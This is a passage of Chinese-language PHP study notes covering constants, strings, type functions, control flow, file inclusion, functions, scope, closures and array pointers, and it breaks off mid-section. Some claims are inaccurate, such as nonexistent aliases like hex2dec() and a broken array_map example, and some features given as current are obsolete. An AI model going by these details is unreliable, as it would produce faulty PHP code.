class="line">PATH_SEPARATOR  //路径分隔符(Windows为分号，类Unix为冒号)</span><br><span class="line">DIRECTORY_SEPARATOR //目录分隔符</span><br><span class="line">PHP_EOL //当前系统的换行符</span><br><span class="line">PHP_VERSION //PHP版本号</span><br><span class="line">PHP_OS  //PHP服务操作系统</span><br><span class="line">PHP_SAPI    //用来判断是使用命令行还是浏览器执行的，如果 PHP_SAPI==&#x27;cli&#x27; 表示是在命令行下执行</span><br><span class="line">PHP_INT_MAX                    INT最大值，32位平台时值为2147483647</span><br><span class="line">PHP_INT_SIZE                   INT字长，32位平台时值为4（4字节）</span><br><span class="line">M_PI    //圆周率值</span><br><span class="line">M_E     //自然数</span><br><span class="line"> </span><br><span class="line">//PHP运行环境检测函数</span><br><span class="line">php_sapi_name() //返回一个PHP与WEB服务器接口类型的小写字符串</span><br><span class="line">该函数返回值与常量PHP_SAPI一致！</span><br><span class="line">接口类型：SAPI(the Server API, SAPI)</span><br><span class="line">可能值：aolserver、apache、apache2filter、apache2handler、caudium、cgi、cgi-fcgi、cli、 continuity、embed、isapi、litespeed milter、nsapi、phttpd、pi3web、roxen、thttpd、tux、webjames</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">/* 大小写问题 */</span><br><span class="line">- 类名、方法名、属性名、函数名：不区分大小写</span><br><span class="line">- 变量名、常量名、元素下标：区分大小写</span><br><span class="line"> </span><br><span class="line">/* 可变标识符 */</span><br><span class="line">可变变量  $i = 3; $k = &#x27;i&#x27;; echo $$k; //输出3</span><br><span class="line">可变函数  function func() &#123;echo &#x27;hello!&#x27;;&#125; $i = &#x27;func&#x27;; $i(); //输出hello</span><br><span class="line">可变下标  $i = &#x27;1234&#x27;; $k = 3; echo $i[$k];   //输出4</span><br><span class="line">可变类名  class CLS&#123;public $k = &#x27;hello&#x27;;&#125; $i = &#x27;CLS&#x27;; $j = new $i; echo $j-&gt;k;</span><br><span class="line">可变属性  class CLS&#123;public $k = &#x27;hello&#x27;;&#125; $i = &#x27;k&#x27;; $j = new CLS; echo $j-&gt;$i;</span><br><span class="line">可变方法  class CLS&#123;public function k()&#123;echo &#x27;hello&#x27;;&#125;&#125; $i=&#x27;k&#x27;; $j=new CLS; $j-&gt;$i();</span><br><span class="line"> </span><br><span class="line">/* 可变变量 */</span><br><span class="line">* 用于业务逻辑判断得到某些具体信息</span><br><span class="line">    $var_name = &quot;class_name&quot;;</span><br><span class="line">    $$var_name = &quot;PHP0913&quot;;        // $class_name = &quot;PHP0913&quot;;$class_name已存入内存中</span><br><span class="line">    var_dump($class_name);        // var_dump($$var_name);</span><br><span class="line"> </span><br><span class="line">/* 变量函数 */</span><br><span class="line">get_defined_vars    //返回由所有已定义变量所组成的数组(包括环境变量、服务器变量和用户定义的变量)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">/* unset() */</span><br><span class="line">* unset()仅删除当前变量名和引用，其值并未被删除</span><br><span class="line">* 引用传递中，删除一个变量及其引用，其他变量及引用均存在，且值依然存在</span><br><span class="line"> </span><br><span class="line">     echo &quot;&lt;br /&gt;&quot;;</span><br><span class="line">    $v3 = &#x27;值&#x27;;</span><br><span class="line">    $v4 = &amp;$v3;</span><br><span class="line">    unset($v4);</span><br><span class="line">    var_dump($v3, $v4);</span><br><span class="line"> </span><br><span class="line">/* 变量的最长有效期 */</span><br><span class="line">* 当前脚本的执行周期，脚本执行结束，变量即消失</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">/* 预定义变量/超全局变量 */</span><br><span class="line">$GLOBALS</span><br><span class="line">$_COOKIE</span><br><span class="line">$_ENV</span><br><span class="line">$_FILES</span><br><span class="line">$_GET</span><br><span class="line">$_POST</span><br><span class="line">$_REQUEST</span><br><span class="line">$_SERVER</span><br><span class="line">$_SESSION</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">/* 常量定义 */</span><br><span class="line">define(常量名, 常量值, [区分大小写参数])        //true表示不区分/false表示区分大小写</span><br><span class="line">const 常量名 = 常量值    // 新，建议</span><br><span class="line">常量名可以使用特殊字符</span><br><span class="line">constant($name)        // 获取常量名</span><br><span class="line">                    // 例：echo constant(&#x27;-_-&#x27;);</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">/* 常量相关函数 */</span><br><span class="line">defined</span><br><span class="line">get_defined_constants</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">/* 预定义常量 */</span><br><span class="line">__FILE__            所在文件的绝对路径</span><br><span class="line">__LINE__            文件中的当前行号</span><br><span class="line">__DIR__            文件所在目录</span><br><span class="line">__FUNCTION__        函数名称</span><br><span class="line">__CLASS__            类的名称</span><br><span class="line">__METHOD__        类的方法名</span><br><span class="line">__NAMESPACE__        当前命名空间的名称</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">/* 整型 */</span><br><span class="line">整型占用4字节，共4*8=32位，最大值为2147483647，最小值为-2147483648，最小值的绝对值比最大值的大1</span><br><span class="line">最高为表示正负，1表示负，0表示正</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">/* 进制转换函数 */</span><br><span class="line">只能十进制与其他进制进行转换，只有六种</span><br><span class="line">转换时，参数应是字符串（即不可含八进制的“0”或十六进制的“0x”）</span><br><span class="line">    dec</span><br><span class="line">     bin</span><br><span class="line">     oct</span><br><span class="line">    hex</span><br><span class="line">hexdec()    十六进制转十进制        也可写hex2dec()</span><br><span class="line">dechex()    十进制转十六进制        也可写dec2hex()</span><br><span class="line">bindec()    二进制转十进制        也可写bin2dec()</span><br><span class="line">decbin()    十进制转二进制        也可写dex2bin()</span><br><span class="line">octdec()    八进制转十进制        也可写oct2dec()</span><br><span class="line">decoct()    十进制转八进制        也可写dec2oct()</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">/* 浮点数 */</span><br><span class="line">浮点数不能比较大小 ！！！</span><br><span class="line">几乎所有小数，在保存时都是近似值而不是精确值！</span><br><span class="line">最大值：+/- 1.8E308</span><br><span class="line">PHP所能保存的最长小数位：14位</span><br><span class="line"> </span><br><span class="line">/* 单引号字符串 */</span><br><span class="line">单引号字符串中，只能转义反斜杠和单引号</span><br><span class="line"> </span><br><span class="line">/* 双引号字符串 */</span><br><span class="line">只解析字符串一次 ！！！</span><br><span class="line">eval     把字符串作为PHP代码执行</span><br><span class="line">大括号包裹变量，可确定变量名界限。如：&quot;aaa&#123;$bbb&#125;ccc&quot;</span><br><span class="line">双引号中可以将ASCII码转换为字符</span><br><span class="line">&quot;\x61&quot; -&gt; a    // 字符串中不需0，整型中才是0x前导</span><br><span class="line">&quot;\x49\x54\x43\x41\x53\x54&quot; -&gt; ITCAST</span><br><span class="line">将ASCII转成字符函数chr()</span><br><span class="line">将字符转成ASCII函数ord()</span><br><span class="line">#双引号转义列表</span><br><span class="line">\n 换行</span><br><span class="line">\r 回车</span><br><span class="line">\t 水平制表符</span><br><span class="line">\\ 反斜线</span><br><span class="line">\$ 美元标记</span><br><span class="line">\v 垂直制表符</span><br><span class="line">\e Escape</span><br><span class="line">\f 换页</span><br><span class="line">\&quot; 双引号&quot;</span><br><span class="line">\[0-7]&#123;1,3&#125; 符合该正则表达式序列的是一个以八进制方式来表达的字符  </span><br><span class="line">\x[0-9A-Fa-f]&#123;1,2&#125; 符合该正则表达式序列的是一个以十六进制方式来表达的字符  </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">/* 定界符 */</span><br><span class="line">herodoc - 功能同双引号，能解析</span><br><span class="line">$str = &lt;&lt;&lt;AAA</span><br><span class="line">字符串内容</span><br><span class="line">AAA;</span><br><span class="line"> </span><br><span class="line">nowdoc - 功能同单引号，不能解析</span><br><span class="line">只在开始位置有单引号</span><br><span class="line">$str = &lt;&lt;&lt;&#x27;AAA&#x27;</span><br><span class="line">字符串内容</span><br><span class="line">AAA;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">/* 字符串的使用 */</span><br><span class="line">可将字符串当作一个字符的集合来使用，可独立访问每个字符。仅适用于单字节字符（字母、数字、半角标点符号），像中文等不可用</span><br><span class="line">$str = &quot;abcd&quot;;</span><br><span class="line">echo $str[3];   // d</span><br><span class="line">echo $str&#123;0&#125;;   // a</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">/* 【类型操作函数】 */</span><br><span class="line">//获取/设置类型</span><br><span class="line">gettype($var) //获取变量的数据类型</span><br><span class="line">settype($var, $type) //设置变量的数据类型</span><br><span class="line"> </span><br><span class="line">//类型判断</span><br><span class="line">is_int</span><br><span class="line">is_float</span><br><span class="line">is_null</span><br><span class="line">is_string</span><br><span class="line">is_resource</span><br><span class="line">is_array</span><br><span class="line">is_bool</span><br><span class="line">is_object       </span><br><span class="line">is_numeric      检测变量是否为数字或数字字符串</span><br><span class="line"> </span><br><span class="line">//转换成指定的数据类型</span><br><span class="line">boolval</span><br><span class="line">floatval</span><br><span class="line">intval</span><br><span class="line">strval</span><br><span class="line"> </span><br><span class="line">//强制转换类型</span><br><span class="line">(int)</span><br><span class="line">(float)</span><br><span class="line">(string)</span><br><span class="line">(bool)</span><br><span class="line">(array)</span><br><span class="line">(object)</span><br><span class="line">(unset) //转换为NULL</span><br><span class="line">(binary) 转换和 b前缀转换  //转换成二进制</span><br><span class="line"> </span><br><span class="line">var_dump        打印变量的相关信息。</span><br><span class="line">                显示关于一个或多个表达式的结构信息，包括表达式的类型与值。</span><br><span class="line">                数组将递归展开值，通过缩进显示其结构。</span><br><span class="line">var_export($var [,bool $return]) //输出或返回一个变量的字符串表示</span><br><span class="line">    $return：为true，则返回变量执行后的结果</span><br><span class="line">print_r         打印关于变量的易于理解的信息</span><br><span class="line">empty           检查一个变量是否为空</span><br><span class="line">isset           检测变量是否存在</span><br><span class="line"> </span><br><span class="line">/* 【流程控制】 */</span><br><span class="line">//if语句的替代语法</span><br><span class="line">if (条件判断) :</span><br><span class="line">   语句块;</span><br><span class="line">elseif (条件判断) :</span><br><span class="line">   语句块;</span><br><span class="line">else :</span><br><span class="line">   语句块;</span><br><span class="line">endif;</span><br><span class="line"> </span><br><span class="line">//流程控制的替代语法</span><br><span class="line">在嵌入HTML时常用</span><br><span class="line">将 &#123; 换成 : , 将 &#125; 换成 endif; 等</span><br><span class="line">endif</span><br><span class="line">endwhile</span><br><span class="line">endfor</span><br><span class="line">endforeach</span><br><span class="line">endswitch</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">/* 【switch】 */</span><br><span class="line">switch (条件) &#123;</span><br><span class="line">   case 状态值1:</span><br><span class="line">       语句块;</span><br><span class="line">       [break;]</span><br><span class="line">   case 状态值2:</span><br><span class="line">       语句块;</span><br><span class="line">       [break;]</span><br><span class="line">   case 状态值3:</span><br><span class="line">   case 状态值4:</span><br><span class="line">       语句块;</span><br><span class="line">       [break;]</span><br><span class="line">   default:</span><br><span class="line">       语句块;</span><br><span class="line">       [break;]</span><br><span class="line">&#125;</span><br><span class="line">switch是状态分支，特殊的循环</span><br><span class="line">先计算出状态值，再去与判断数作比较</span><br><span class="line">break退出流程</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">/* 【for循环】 */</span><br><span class="line">for (条件初始化表达式; 条件判断表达式; 条件变化表达式) &#123;</span><br><span class="line">循环体</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">假设循环体被执行了N次，则</span><br><span class="line">条件初始化表达式被执行1次</span><br><span class="line">条件判断表达式被执行N+1次</span><br><span class="line">条件变化表达式被执行N次</span><br><span class="line"> </span><br><span class="line">注意：</span><br><span class="line">    1. 循环变量在for语句结束后还可以继续使用，值为第一次失败的值</span><br><span class="line">    2. 循环变量在for循环体内可以使用</span><br><span class="line">    3. 任何条件表达式均可省略，但分号不能省略</span><br><span class="line">        a. 条件初始化表达式被省略时，循环变量被赋值为null，在与条件判断时，</span><br><span class="line">            进行类型转换后再比较。也可以在for语句外进行初始化。</span><br><span class="line">        b. 条件判断表达式被省略时，表示循环为真，进入死循环</span><br><span class="line">        c. 条件变化表达式被省略时，可以在循环体内完成</span><br><span class="line">    4. 每个表达式均可由多条语句组成，每条语句之间使用逗号分割</span><br><span class="line">        如果条件判断表达式由多条语句组成，都会执行，但只有最后一条语句才作为判断条件</span><br><span class="line">    5. for只能遍历数值型索引下标数组</span><br><span class="line">        数组长度函数：count()</span><br><span class="line">    6. 应该将可以初始化的语句均放在条件初始化表达式内，这样可以省去很多执行次数</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">/* 【goto】5.3+ 版本 */</span><br><span class="line">用来跳转到程序中的某一指定位置</span><br><span class="line">该目标位置可以用目标名称 加上冒号来标记。</span><br><span class="line">PHP中的goto有一定限制，只能在同一个文件和作用域中跳转，</span><br><span class="line">    也就是说你无法跳出一个函数或类方法，也无法跳入到另一个函数。</span><br><span class="line">    你也无法跳入到任何循环或者switch结构中。</span><br><span class="line">    常见的用法是用来跳出循环或者switch，可以代替多层的break。 </span><br><span class="line">可以从循环(switch)中跳出来，但不能从外部跳转进去。而函数或类方法，向外向内均不可。</span><br><span class="line">goto a;</span><br><span class="line">echo &#x27;Foo&#x27;;</span><br><span class="line">a:</span><br><span class="line">echo &#x27;Bar&#x27;;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">/* 【文件加载】 */</span><br><span class="line">require / include / require_once / include_once</span><br><span class="line">文件载入只是载入目标文件内的代码并执行，与载入的文件类型无关</span><br><span class="line"> </span><br><span class="line">文件载入属于执行阶段，当执行到require等语句时，才载入该文件的代码，</span><br><span class="line">    编译并执行，然后回到require等语句位置继续执行下面的语句</span><br><span class="line">【注意】</span><br><span class="line">    在载入开始时，先退出PHP模式；</span><br><span class="line">    再载入目标文件代码，执行该代码；</span><br><span class="line">    结束时，再进入PHP模式。</span><br><span class="line">require：处理失败，产生 E_COMPILE_ERROR 错误，脚本中止。</span><br><span class="line">include：处理失败，产生 E_WARNING 错误，脚本继续执行。</span><br><span class="line"> </span><br><span class="line">#不建议使用require_once/include_once</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">/* 【相对路径】 */</span><br><span class="line">当前浏览器请求的哪个脚本，当前位置就是属于哪个脚本。</span><br><span class="line">./file 和 file 都表示当前目录下的file文件</span><br><span class="line">file情况（嵌套载入文件时）：</span><br><span class="line">如果当前目录没找到该文件就在代码文件所在目录中继续找。</span><br><span class="line">如果当前目录找到有该文件，则不会再在代码文件所在目录去找也不会再加载。</span><br><span class="line">__DIR__     脚本文件所在目录</span><br><span class="line">__FILE__    脚本文件路径</span><br><span class="line"> </span><br><span class="line">include_path    加载文件查找目录</span><br><span class="line">    set_include_path()  设置include_path，可多个，用字符串作参数</span><br><span class="line">    该函数设置的path只针对该当前文件有效</span><br><span class="line">    该设置只针对查找未直接写文件路径方式有效</span><br><span class="line">    设置新的include_path会覆盖原来的</span><br><span class="line"> </span><br><span class="line">    get_include_path()  获取当前include_path设置项，无参数</span><br><span class="line"> </span><br><span class="line">    路径分隔符，在Windows下是分号，在Linux下是冒号</span><br><span class="line">    利用预定义常量 PATH_SEPARATOR 来获得当前的分隔符</span><br><span class="line"> </span><br><span class="line">如果直接写文件名：</span><br><span class="line">    1. include_path所设置的</span><br><span class="line">    2. 当前目录</span><br><span class="line">    3. 代码所在文件的目录</span><br><span class="line">如果文件名前带有路径，则会直接根据路径查找，include_path直接被忽略</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">/* 【return】 */</span><br><span class="line">return与require结合，可返回文件的内容，return写在被载入的文件内</span><br><span class="line">return可以终止所在脚本的执行，作为普通脚本语句</span><br><span class="line">return可以返回函数的相应值</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">/* 【终止和延迟脚本执行】 */</span><br><span class="line">die / exit   终止</span><br><span class="line">return是终止所在脚本的执行</span><br><span class="line">die和exit会立即终止脚本执行</span><br><span class="line">die(&quot;到此为止&quot;);     该函数内的字符串可被输出</span><br><span class="line">sleep()  延迟(单位：秒)</span><br><span class="line">    默认最多可延迟30秒，PHP配置可以修改 max_execution_time</span><br><span class="line">    例：sleep(12);</span><br><span class="line">usleep()    以指定的微秒数延迟执行</span><br><span class="line">time_sleep_until    使脚本睡眠到指定的时间为止</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">/* 【函数】 */</span><br><span class="line">1. 函数的声明是在编译时，故先定义再调用，定义与调用无先后关系！</span><br><span class="line">2. 文件只是代码的载体，程序均在内存中执行！</span><br><span class="line">3. 如果函数的定义在需要载入的文件内，则需要先载入该文件，否则调用出错！</span><br><span class="line">4. 函数的定义可以出现在其他的代码段中，此时函数不会在编译阶段被执行</span><br><span class="line">    只有被执行到时才会被定义！只有独立定义时才会被编译在内存中！</span><br><span class="line">    如果出现在其他函数体内，也需要外层函数被调用时才被定义并生效！</span><br><span class="line">5. 函数名不区分大小写</span><br><span class="line">6. 不允许重名，包括系统函数</span><br><span class="line">7. 【可变函数】</span><br><span class="line">    函数名可以用其他变量代替</span><br><span class="line">    $func_name = &quot;sayHello&quot;;</span><br><span class="line">    $func_name();       //此时调用sayHello()函数</span><br><span class="line">    注意：只有在调用时才能使用变量，定义时不允许！</span><br><span class="line">8. 变量可作为函数名调用函数，数组元素值也可以！</span><br><span class="line">9. 形式参数parameter，实际参数argument</span><br><span class="line">    可以对参数传递 null，表示该形参不想传递值</span><br><span class="line">    形参与实参之间既可值传递，也可引用传递。</span><br><span class="line">    引用传递参数，应该在定义函数时就在形式参数前加上 &amp; 符号，而此时调用函数实参必须为变量</span><br><span class="line">    如何选择使用哪种传递方式？</span><br><span class="line">        a. 是否需要保证原始数据的完整性</span><br><span class="line">        b. 是否需要增加效率</span><br><span class="line">        c. 对大数据引用传递可节省内存</span><br><span class="line">10. 参数默认值</span><br><span class="line">        a. 函数的参数默认值必须是已经确定的值，不能是变量！</span><br><span class="line">            只要在调用之前定义该常量，则可以使用常量作为参数默认值</span><br><span class="line">        b. 函数默认值可以有多个，建议将有默认值的参数放在参数列表的最后面</span><br><span class="line">           这样可以在调用函数时，不赋予后面有默认值的参数值，否则会出错</span><br><span class="line">        c. 默认参数可以是非标量类型，比如数组、null</span><br><span class="line">        d. 任何默认参数必须放在任何非默认参数的右侧</span><br><span class="line">11. 参数数量</span><br><span class="line">    a. 形参数量多于实参数量</span><br><span class="line">        报告警告级别错误，并以NULL代替</span><br><span class="line">    b. 实参多于形参</span><br><span class="line">        不报告错误，依次为形参赋值</span><br><span class="line">    c. 不确定参数数量</span><br><span class="line">        1) 一个形参都不定义，永远都是实参多于形参</span><br><span class="line">        2) 【可变数量参数】</span><br><span class="line">            func_get_args() 获取当前函数被调用时所有实参的值，返回一个所有实参值组成的数组</span><br><span class="line">            func_get_arg()  获取某个实参的值，通过索引值标识，e.g: func_get_arg(0)</span><br><span class="line">            func_num_args() 获取所有实参的数量</span><br><span class="line">12. 【return】返回值</span><br><span class="line">    a. 函数只有一个返回值，可以通过返回一个数组来得到类似的结果，但可以有多条return语句</span><br><span class="line">    b. return语句会立即中止函数的运行，并将控制权交回调用该函数的代码行</span><br><span class="line">    c. 可以返回包括数组和对象的任意类型</span><br><span class="line">    d. 函数的返回也分值传递和引用传递（返回的是一个变量才可）</span><br><span class="line">        1) 默认是值传递方式</span><br><span class="line">        2) 引用传递方式：</span><br><span class="line">            - 定义函数时，函数名前加上&amp; 表示该函数可以返回引用</span><br><span class="line">            - 调用函数时，函数名前加上&amp; 表示取得函数返回的引用</span><br><span class="line">                此时，函数外修改返回值，会修改函数内的该返回变量的值</span><br><span class="line">            - 如果函数需返回引用，则需要返回一个变量才可以</span><br><span class="line">            - 从函数返回一个引用，必须在函数声明和指派返回值给一个变量时都使用引用操作符&amp;</span><br><span class="line">                function &amp;returns_reference()&#123;return $someref;&#125;</span><br><span class="line">                $newref =&amp; returns_reference();</span><br><span class="line">        3) 返回引用的作用</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">/* 【变量作用域】 */</span><br><span class="line">a. 全局变量和局部变量</span><br><span class="line">    1) 作用域之间不重叠，即不同作用域的变量，之间不可访问</span><br><span class="line">    2) 全局作用域  - 函数之外的区域</span><br><span class="line">    3) 局部作用域  - 函数内的区域，每个函数都是一个独立的作用域</span><br><span class="line"> </span><br><span class="line">b. 超全局变量，既可以在全局也可在局部使用，仅能用系统自带的，均是数组变量。</span><br><span class="line">    $GLOBALS    $_COOKIE    $_ENV       $_FILES $_GET</span><br><span class="line">    $_POST      $_REQUEST   $_SERVER    $_SESSION</span><br><span class="line">c. $GLOBALS</span><br><span class="line">    1) 不能存在超全局变量，但可以有超全局的数据！</span><br><span class="line">    2) 将需要的数据放到超全局变量的数组内，但统一使用$GLOBALS</span><br><span class="line">    3) $GLOBALS 特征</span><br><span class="line">        - 每个全局变量就是对应$GLOBALS内的一个元素！</span><br><span class="line">            每当增加一个全局，则自动在$GLOBALS内增加一个同名元素！</span><br><span class="line">            同理，每当增加元素，也会增加一个全局变量，一般在函数内增加</span><br><span class="line">        - 做的任何修改，也会映射到另一个，包括更新和删除</span><br><span class="line">            在函数内访问全局变量，只需使用$GLOBALS</span><br><span class="line">        - 出现过的全局变量，就可以通过$GLOBALS这个数组取得</span><br><span class="line">    4) PHP生命周期中，定义在函数体外部的所谓全局变量，函数内部是不能直接获得的</span><br><span class="line">4) global关键字（不建议使用）</span><br><span class="line">    将局部变量声明为同名全局变量的一个&#x27;引用&#x27;！相当于常量的引用传递</span><br><span class="line">        global $var;    // $var = &amp;$GLOBALS[&#x27;var&#x27;];</span><br><span class="line">        不同于$GLOBALS！！！</span><br><span class="line">    global在函数产生一个指向函数外部变量的别名变量，而不是真正的函数外部变量。</span><br><span class="line">    $GLOBALS确确实实调用是外部的变量，函数内外会始终保持一致。</span><br><span class="line">    global的作用是定义全局变量，但是这个全局变量不是应用于整个网站，而是应用于当前页面，包括include或require的所有文件。</span><br><span class="line">d. </span><br><span class="line">    1) 作用域只针对变量，对常量无效</span><br><span class="line">    2) 被载入文件中定义的变量作用域取决于被载入的位置。</span><br><span class="line">        函数外被载入就是全局，函数内被载入就是局部！</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">/* 【变量生命周期】 */</span><br><span class="line">1. 脚本结束时，全局变量消失</span><br><span class="line">2. 函数执行完时，局部变量消失</span><br><span class="line">3. 静态变量</span><br><span class="line">    static关键字</span><br><span class="line">        静态变量仅在局部函数域中存在，但当程序执行离开此作用域时，其值并不丢失。</span><br><span class="line">        静态变量仅会被初始化一次，其他局部变量每次被调用时都会被重新赋值。</span><br><span class="line">        static声明的静态变量的生命周期会被一直延续。</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">/* 【迭代和递归】 */</span><br><span class="line">迭代比递归效率高！</span><br><span class="line">迭代是一种思想（算法），结构和使用上如同循环！</span><br><span class="line">递归是一种思想（算法），将大问题拆分成小问题，逐一解决小问题以解决大问题</span><br><span class="line">    要求大问题和小问题的解决方案是一致的！</span><br><span class="line">    递归的结构和语法体现如图函数。函数体内调用函数本身！</span><br><span class="line">    递归出口：当该问题可以解决时，则不用再递归</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">/* 【匿名函数/闭包函数】 */</span><br><span class="line">匿名函数，也叫闭包函数(closures)，允许临时创建一个没有指定名称的函数。</span><br><span class="line"> </span><br><span class="line">1. 定义匿名函数时，不需增加函数名。</span><br><span class="line">2. PHP对匿名函数的管理，以一个对象的方式进行处理。</span><br><span class="line">3. 匿名函数应该存放到变量内。</span><br><span class="line">4. 匿名函数通过Closure类来实现</span><br><span class="line">5. 可以使用函数作为函数的参数和返回值</span><br><span class="line">6. 声明函数时可以使用 use($param) 来向函数中传入函数外的变量，结合变量引用来实现闭包</span><br><span class="line">7. 可以用变量引用函数</span><br><span class="line">$func = function ($e) &#123;</span><br><span class="line">    echo $e;</span><br><span class="line">&#125;;   //结束时，需分号结束，如同变量赋值</span><br><span class="line">var_dump($func);     //使用匿名函数</span><br><span class="line">$func(&#x27;ITCAST&#x27;);     //函数的调用</span><br><span class="line">    这不是可变函数，而是对象。Closure闭包类</span><br><span class="line">//use语法</span><br><span class="line">匿名函数倾向于值的概念，可能出现在任何地方。</span><br><span class="line">use可以使得匿名函数使用其外部作用域的变量。非全局！</span><br><span class="line">use与全局的区别：</span><br><span class="line">    use使用其外部作用域的变量</span><br><span class="line">function out() &#123;</span><br><span class="line">    $v = &quot;in out&quot;;</span><br><span class="line">    $func = function () use (&amp; $v) &#123;</span><br><span class="line">        var_dump($v);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    use类似参数的自动传递，也支持值与引用的传递方式。</span><br><span class="line">//作用</span><br><span class="line">    常作为&#x27;临时函数&#x27;被调用（只在某个地方被调用的函数）</span><br><span class="line">    例如：</span><br><span class="line">        PHP存在一个array_map()函数，功能是针对一个函数内每个元素，去调用某个函数</span><br><span class="line">        操作结果(array) = array_map(操作函数, 操作数组);</span><br><span class="line">        $result_arr = array_map(function ($v) &#123;return $v3&#125;, $arr);</span><br><span class="line"> </span><br><span class="line">//闭包用法实例</span><br><span class="line">function closureCreater() &#123;</span><br><span class="line">    $x = 1;</span><br><span class="line">    return function($fun = null) use(&amp;$x) &#123;//按引用传值</span><br><span class="line">        echo &quot;&lt;br /&gt;&quot; . $x++;</span><br><span class="line">        $fun and $fun();</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">$x = &quot;hello world&quot;;</span><br><span class="line">$test = closureCreater();</span><br><span class="line">$test();</span><br><span class="line">$test(function()&#123; echo &quot;closure test one&quot;; &#125;);</span><br><span class="line">$test(function()&#123; echo &quot;closure test two&quot;; &#125;);</span><br><span class="line">$test(function() use($x)&#123; echo &quot;&lt;br /&gt;&quot;.$x;&#125;);</span><br><span class="line"> </span><br><span class="line">//将函数保存为数组元素</span><br><span class="line">$x = &#x27;outer param.&#x27;;</span><br><span class="line">$arr = array();</span><br><span class="line">$arr[] = function($str)use($x)&#123; return $str.$x; &#125;;</span><br><span class="line">echo $arr[0](&#x27;test fun in arr,&#x27;);</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">/* 【数组】 */</span><br><span class="line">关联数组：键和值有关联，键表示值的逻辑含义。</span><br><span class="line">索引数组：键和值无关联，键表示值的位置。通常下标从0开始，递增元素</span><br><span class="line">count($var [,$mode]) //统计数组元素个数</span><br><span class="line">    $mode可选，设为1或true时则递归统计</span><br><span class="line">    $var非数组，返回1；$var未初始化或等于null或空数组，返回0</span><br><span class="line"> </span><br><span class="line">//键名的使用</span><br><span class="line">整型数字键不需加引号($arr[1])</span><br><span class="line">字符串数字键也不需加引号($arr = array(&#x27;1&#x27;=&gt;&#x27;abc&#x27;); $arr[1])</span><br><span class="line">关联数组，字符串键需加引号($arr = array(&#x27;a&#x27;=&gt;&#x27;aaa&#x27;); $arr[&#x27;a&#x27;])</span><br><span class="line">关联数组，双引号中解析变量，可不加引号($arr = array(&#x27;a&#x27;=&gt;&#x27;aaa&#x27;); &quot;$arr[a]&quot;)</span><br><span class="line"> </span><br><span class="line">/* 【指针】 */</span><br><span class="line">current/pos    返回当前被内部指针指向的数组单元的值，并不移动指针。</span><br><span class="line">key            返回数组中当前单元的键名，并不移动指针</span><br><span class="line">next        将数组中的内部指针向前移动一位，并返回移动后当前单元的值。先移动，再取值。</span><br><span class="line">prev        将数组的内部指针倒回一位，并返回移动后当前单元的值先移动，再取值。</span><br><span class="line">end            将数组的内部指针指向最后一个单元，并返回最后一个单元的值</span><br><span class="line">reset        将数组的内部指针指向第一个单元，并返回第一个数组单元的值</span><br><span class="line"> </span><br><span class="line">each    返回数组中当前的键/值对并将数组指针向前移动一步。</span><br><span class="line">            返回的是一个由键和值组成的长度为4的数组，下标0和key表示键，下标1和value表示值</span><br><span class="line">                在执行each()之后，数组指针将停留在数组中的下一个单元</span><br><span class="line">                    或者当碰到数组结尾时停留在最后一个单元。</span><br><span class="line">                    如果要再用 each 遍历数组，必须使用 reset()。</span><br><span class="line"> </span><br><span class="line">    1. 以上指针操作函数，除了key()，若指针移出数组，则返回false。而key()移出则返回null。</span><br><span class="line">    2. 若指针非法，不能进行next/prev操作，能进行reset/end操作</span><br><span class="line">    3. current/next/prev     若遇到包含空单元（0或&quot;&quot;）也会返回false。而each不会！</span><br><span class="line"> </span><br><span class="line">list    把数组中的值赋给一些变量。list()是语言结构，不是函数</span><br><span class="line">            仅能用于数字索引的数组并假定数字索引从0开始</span><br><span class="line">            /* 可用于交换多个变量的值 */ list($a, $b) = array($b, $a);</span><br><span class="line">    例：list($drink, , $power) = array(&#x27;coffee&#x27;, &#x27;brown&#x27;, &#x27;caffeine&#x27;);</span><br><span class="line"> </span><br><span class="line">1. 复制数组，其指针位置也会被复制。</span><br><span class="line">    特例：如果数组指针非法，则拷贝的数组指针会重置，而原数组的指针不变。</span><br><span class="line">    【指针问题】</span><br><span class="line">        谁第一个进行写操作，就会开辟一个新的值空间。与变量(数组变量)值传递给谁无关。</span><br><span class="line">        数组函数current()被定义为写操作，故会出现问题。</span><br><span class="line">        foreach遍历的是数组的拷贝，当被写时，才会开辟一个新的值空间。</span><br><span class="line">            即，foreach循环体对原数组进行写操作时，才会出现指针问题。</span><br><span class="line">            如果开辟新空间时指针非法，则会初始化指针。</span><br><span class="line">2. 如果指针位置出现问题，则reset()初始化一下就可解决。</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">/* 【遍历数组】 */</span><br><span class="line">* 先找到元素，再获取键和值</span><br><span class="line"> </span><br><span class="line">foreach</span><br><span class="line">    foreach (array_expression as [$key =&gt;] &amp; $value)</span><br><span class="line">      当foreach开始执行时，数组内部的指针会自动指向第一个单元。</span><br><span class="line">      获取元素信息后，移动指针，再执行循环体</span><br><span class="line">      1. 